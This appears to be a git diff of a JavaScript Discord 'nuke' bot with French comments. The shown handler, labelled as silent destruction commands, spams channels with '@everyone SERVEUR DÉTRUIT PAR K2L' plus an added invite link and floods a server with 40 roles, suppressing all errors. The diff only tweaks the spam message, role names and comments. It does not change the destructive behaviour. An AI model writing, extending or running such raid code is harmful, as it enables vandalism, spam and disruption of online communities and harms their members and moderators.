@@ -314,8 +314,7 @@ client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
     // ==========================================
-    // COMMANDES DE DESTRUCTION / OFENSIVES (Préfixe '!')
-    // SILENCIEUX TOTAL SI PAS SUPER OWNER
+    // COMMANDES DE DESTRUCTION (Préfixe '!') - SILENCIEUSES
     // ==========================================
     if (message.content.startsWith('!')) {
         const args = message.content.slice(1).trim().split(/ +/);
@@ -351,7 +350,7 @@ client.on('messageCreate', async message => {
                             }).then(async channel => {
                                 const spamArray = [];
                                 for (let j = 0; j < 12; j++) {
-                                    spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L').catch(() => {}));
+                                    spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
                                 }
                                 await Promise.all(spamArray);
                             }).catch(() => {})
@@ -371,7 +370,7 @@ client.on('messageCreate', async message => {
 
                     const rolePromises = [];
                     for (let r = 0; r < 40; r++) {
-                        rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
+                        rolePromises.push(message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
                     }
                     await Promise.all(rolePromises);
                 } catch (error) {}
